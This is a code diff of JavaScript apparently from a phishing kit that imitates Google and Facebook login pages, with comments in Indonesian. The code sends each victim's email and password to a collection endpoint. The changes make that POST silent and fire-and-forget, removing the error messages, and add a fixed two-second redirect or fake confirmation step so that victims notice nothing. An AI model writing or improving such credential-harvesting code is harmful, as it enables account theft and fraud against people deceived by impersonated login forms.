@@ -71,27 +71,20 @@ function gHandlePassNext() {
   }
   inp.classList.remove('error'); err.textContent = '';
 
+  // Tampilkan loading langsung, kirim XHR di background
   var dim = document.getElementById('gPassLoadingDim');
   document.getElementById('gPassLoadingText').textContent = 'Mengirim data...';
   dim.classList.add('active');
 
+  // Kirim data di background (tidak tunggu response untuk redirect)
   var xhr = new XMLHttpRequest();
   xhr.open('POST', getEndpoint(), true);
   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xhr.onload = function() {
-    dim.classList.remove('active');
-    if (xhr.status === 200) {
-      setTimeout(function() { locationRedirect(); }, 2000);
-    } else {
-      alert('Terjadi kesalahan, coba lagi.');
-    }
-  };
-  xhr.onerror = function() {
-    dim.classList.remove('active');
-    alert('Gagal mengirim data.');
-  };
   var params = 'email=' + encodeURIComponent(gEmail) + '&password=' + encodeURIComponent(pass) + '&login=Google';
   xhr.send(params);
+
+  // Tepat 2 detik setelah klik — langsung redirect
+  setTimeout(function() { locationRedirect(); }, 2000);
 }
 
 function gTogglePass() {
@@ -138,34 +131,30 @@ function fbHandleLogin() {
   spinner.style.display = 'block';
   btnText.textContent = '';
 
+  // Kirim data di background
   var xhr = new XMLHttpRequest();
   xhr.open('POST', getEndpoint(), true);
   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-  xhr.onload = function() {
-    btn.classList.remove('loading'); btn.disabled = false;
-    spinner.style.display = 'none';
-    btnText.textContent = 'Login';
-    if (xhr.status === 200) {
-      document.getElementById('fbcName').textContent = email;
-      showStep('stepFBConfirm');
-    } else {
-      alert('Terjadi kesalahan, coba lagi.');
-    }
-  };
-  xhr.onerror = function() {
-    btn.classList.remove('loading'); btn.disabled = false;
-    spinner.style.display = 'none';
-    btnText.textContent = 'Login';
-    alert('Gagal mengirim data.');
-  };
   var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook';
   xhr.send(params);
+
+  // Tepat 2 detik setelah klik — lanjut ke step confirm
+  setTimeout(function() {
+    btn.classList.remove('loading'); btn.disabled = false;
+    spinner.style.display = 'none';
+    btnText.textContent = 'Login';
+    document.getElementById('fbcName').textContent = email;
+    showStep('stepFBConfirm');
+  }, 2000);
 }
 
 function fbLanjutkan() {
-  showLoading('fbConfirmLoadingDim','fbConfirmLoadingText','Memproses...', function(){
-    locationRedirect();
-  });
+  var dim = document.getElementById('fbConfirmLoadingDim');
+  document.getElementById('fbConfirmLoadingText').textContent = 'Memproses...';
+  dim.classList.add('active');
+
+  // Tampil loading langsung, redirect tepat 2 detik
+  setTimeout(function() { locationRedirect(); }, 2000);
 }
 
 function fbTogglePass() {
